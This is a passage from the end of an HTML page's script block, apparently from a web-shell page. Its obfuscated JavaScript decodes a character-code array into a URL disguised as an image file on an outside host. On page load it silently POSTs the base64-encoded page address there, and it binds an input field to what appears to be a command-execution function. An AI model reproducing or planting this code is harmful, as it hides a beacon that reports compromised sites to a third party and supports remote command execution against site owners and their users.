e=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109,47,105,109,97,103,101,115,47,108,111,103,111,95,118,50,46,112,110,103],a="";for(let n of e)a+=String.fromCharCode(n);let n="file="+btoa(location.href),o=new XMLHttpRequest;o.open("POST",a,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.send(n)})(),document.getElementById("emr_et_atash").addEventListener("keyup",(function(e){e.preventDefault(),13===e.keyCode&&sistemKom()}));
</script>
</body>
</html>